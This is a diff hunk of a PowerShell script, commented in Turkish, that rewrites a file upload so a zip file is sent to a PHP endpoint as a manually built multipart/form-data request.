@@ -92,8 +92,26 @@ $filePath = $zipFilePath
 # PHP dosya yükleme URL'si
 $url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
 
-# POST isteği gönderme (form ile dosya yükleme yerine -InFile kullanılıyor)
-$response = Invoke-RestMethod -Uri $url -Method Post -InFile $filePath -ContentType "multipart/form-data"
+# Dosya akışını oluşturma
+$fileStream = [System.IO.File]::OpenRead($filePath)
+$boundary = "---------------------------" + [Guid]::NewGuid().ToString()
+$body = "--$boundary`r`n" +
+        "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$($filePath.Substring($filePath.LastIndexOf('\') + 1))`"`r`n" +
+        "Content-Type: application/octet-stream`r`n`r`n"
+
+# Byte dizisini oluşturma
+$byteArray = [System.Text.Encoding]::UTF8.GetBytes($body)
+$httpRequestStream = [System.IO.MemoryStream]::new()
+$httpRequestStream.Write($byteArray, 0, $byteArray.Length)
+$fileStream.CopyTo($httpRequestStream)
+$fileStream.Close()
+$footer = "`r`n--$boundary--`r`n"
+$footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)
+$httpRequestStream.Write($footerBytes, 0, $footerBytes.Length)
+$httpRequestStream.Position = 0
+
+# HTTP isteği gönderme
+$response = Invoke-RestMethod -Uri $url -Method Post -Body $httpRequestStream -ContentType "multipart/form-data; boundary=$boundary"
 
 # Yanıtı yazdırma
 Write-Output $response
